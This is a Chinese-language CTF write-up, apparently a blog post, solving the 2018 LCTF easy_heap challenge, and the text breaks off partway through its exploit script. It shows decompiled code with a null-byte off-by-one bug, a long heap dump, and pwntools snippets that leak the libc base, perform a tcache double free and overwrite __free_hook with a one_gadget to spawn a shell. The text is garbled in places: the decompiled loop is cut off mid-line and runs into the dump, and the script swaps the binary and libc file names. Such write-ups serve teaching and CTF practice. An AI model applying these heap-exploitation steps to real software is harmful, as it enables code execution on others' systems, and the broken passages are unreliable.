## 前言：
花时间学习了一下tcache的一些东西，现在来写一写关于这个机制的两道解题过程。
## 正文：
### 2018 LCTF easy_heap：
一道关于`tcache`的利用题，也是之前打`LCTF`的第一题，现在来看一看。
试试程序发现是常规的堆题。
来看看伪代码：
漏洞主要就出在创建堆函数中，存在一个`null-byte-one`漏洞：
    unsigned __int64 __fastcall sub_BEC(_BYTE *a1, int a2)
    {
      unsigned int v3; // [rsp+14h] [rbp-Ch]
      unsigned __int64 v4; // [rsp+18h] [rbp-8h]
      v4 = __readfsqword(0x28u);
      v3 = 0;
      if ( a2 )
      {
        while ( 1 )
        {
          read(0, &a1[v3], 1uLL);
          if ( a2 - 1  最后一块没create的unsort bin堆块
    0x55b13d397310: 0x0000000000000000  0x000055b13d397500
    0x55b13d397320: 0x0000000000000000  0x0000000000000000
    0x55b13d397330: 0x0000000000000000  0x0000000000000000
    0x55b13d397340: 0x0000000000000000  0x0000000000000000
    0x55b13d397350: 0x0000000000000000  0x0000000000000000
    0x55b13d397360: 0x0000000000000000  0x0000000000000000
    0x55b13d397370: 0x0000000000000000  0x0000000000000000
    0x55b13d397380: 0x0000000000000000  0x0000000000000000
    0x55b13d397390: 0x0000000000000000  0x0000000000000000
    0x55b13d3973a0: 0x0000000000000000  0x0000000000000000
    0x55b13d3973b0: 0x0000000000000000  0x0000000000000000
    0x55b13d3973c0: 0x0000000000000000  0x0000000000000000
    0x55b13d3973d0: 0x0000000000000000  0x0000000000000000
    0x55b13d3973e0: 0x0000000000000000  0x0000000000000000
    0x55b13d3973f0: 0x0000000000000000  0x0000000000000000
    0x55b13d397400: 0x0000000000000100  0x0000000000000101
    0x55b13d397410: 0x0000000000000000  0x0000000000000000
    0x55b13d397420: 0x0000000000000000  0x0000000000000000
    0x55b13d397430: 0x0000000000000000  0x0000000000000000
    0x55b13d397440: 0x0000000000000000  0x0000000000000000
    0x55b13d397450: 0x0000000000000000  0x0000000000000000
    0x55b13d397460: 0x0000000000000000  0x0000000000000000
    0x55b13d397470: 0x0000000000000000  0x0000000000000000
    0x55b13d397480: 0x0000000000000000  0x0000000000000000
    0x55b13d397490: 0x0000000000000000  0x0000000000000000
    0x55b13d3974a0: 0x0000000000000000  0x0000000000000000
    0x55b13d3974b0: 0x0000000000000000  0x0000000000000000
    0x55b13d3974c0: 0x0000000000000000  0x0000000000000000
    0x55b13d3974d0: 0x0000000000000000  0x0000000000000000
    0x55b13d3974e0: 0x0000000000000000  0x0000000000000000
    0x55b13d3974f0: 0x0000000000000000  0x0000000000000000
    0x55b13d397500: 0x0000000000000000  0x0000000000000101  --> 此时堆块是在使用的
    0x55b13d397510: 0x000055b13d397300  0x000055b13d397700
    0x55b13d397520: 0x0000000000000000  0x0000000000000000
    0x55b13d397530: 0x0000000000000000  0x0000000000000000
    0x55b13d397540: 0x0000000000000000  0x0000000000000000
    0x55b13d397550: 0x0000000000000000  0x0000000000000000
    0x55b13d397560: 0x0000000000000000  0x0000000000000000
    0x55b13d397570: 0x0000000000000000  0x0000000000000000
    0x55b13d397580: 0x0000000000000000  0x0000000000000000
    0x55b13d397590: 0x0000000000000000  0x0000000000000000
    0x55b13d3975a0: 0x0000000000000000  0x0000000000000000
    0x55b13d3975b0: 0x0000000000000000  0x0000000000000000
    0x55b13d3975c0: 0x0000000000000000  0x0000000000000000
    0x55b13d3975d0: 0x0000000000000000  0x0000000000000000
    0x55b13d3975e0: 0x0000000000000000  0x0000000000000000
    0x55b13d3975f0: 0x0000000000000000  0x0000000000000000
    0x55b13d397600: 0x0000000000000100  0x0000000000000100  --> 用上了'n-b-o'
    0x55b13d397610: 0x000055b13d397400  0x0000000000000000
    0x55b13d397620: 0x0000000000000000  0x0000000000000000
    0x55b13d397630: 0x0000000000000000  0x0000000000000000
    0x55b13d397640: 0x0000000000000000  0x0000000000000000
    0x55b13d397650: 0x0000000000000000  0x0000000000000000
    0x55b13d397660: 0x0000000000000000  0x0000000000000000
    0x55b13d397670: 0x0000000000000000  0x0000000000000000
    0x55b13d397680: 0x0000000000000000  0x0000000000000000
    0x55b13d397690: 0x0000000000000000  0x0000000000000000
    0x55b13d3976a0: 0x0000000000000000  0x0000000000000000
    0x55b13d3976b0: 0x0000000000000000  0x0000000000000000
    0x55b13d3976c0: 0x0000000000000000  0x0000000000000000
    0x55b13d3976d0: 0x0000000000000000  0x0000000000000000
    0x55b13d3976e0: 0x0000000000000000  0x0000000000000000
    0x55b13d3976f0: 0x0000000000000000  0x0000000000000000
    0x55b13d397700: 0x0000000000000000  0x0000000000000101
    0x55b13d397710: 0x000055b13d397500  0x00007f384a260ca0
    0x55b13d397720: 0x0000000000000000  0x0000000000000000
    0x55b13d397730: 0x0000000000000000  0x0000000000000000
    0x55b13d397740: 0x0000000000000000  0x0000000000000000
    0x55b13d397750: 0x0000000000000000  0x0000000000000000
    0x55b13d397760: 0x0000000000000000  0x0000000000000000
    0x55b13d397770: 0x0000000000000000  0x0000000000000000
    0x55b13d397780: 0x0000000000000000  0x0000000000000000
    0x55b13d397790: 0x0000000000000000  0x0000000000000000
    0x55b13d3977a0: 0x0000000000000000  0x0000000000000000
这里需要注意的一个点就是，当分配第一个unsort bin中的堆块时，会将unsort
bin中的堆块放到tcache当中去，所以后面需要将tcache填满时只需填上6个即可。
然后再利用`null-byte-one`实现unlink。
    delete(5)
这样我们可以泄漏出libc地址，而且有两个指针指向同一个堆块，可以free掉两次，实现tcache dup。
    #泄漏libc地址：
    for i in range(9) :
        p.recvuntil('> ')
    data = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = data - 4111520
    log.success('libc base is :'+hex(libc_base))
    free_hook = libc_base + 4118760
    one_gadget = libc_base + 0x4f322
    log.success('free hook is :'+hex(free_hook))
因为程序开了`Full RELRO`，所以这里就修改`__free_hook`成`one_gadget`来getshell。
    for i in range(7) :
        create(0xf0,'\n')
    create(0xf0,'\n')
    delete(0) #空出一个位置来为后面做准备
    delete(8)
    delete(9)
    create(0xf0,p64(free_hook))
    create(0xf0,p64(free_hook)) tcache指向了free_hook
    create(0xf0,p64(one_gadget)) 修改为one_gadget
    delete(1) #触发
## EXP：
    from pwn import *
    p = process('./easy_heap')
    libc = ELF('easy_heap')
    elf = ELF('./libc64.so')
    context.log_level = 'debug'
    def create(size,content) :
        p.sendlineafter('> ','1')
        p.sendlineafter('> ',str(size))
        p.sendlineafter('> ',content)
    def show(index) :
        p.sendlineafter('> ','3')
        p.sendlineafter('> ',str(index))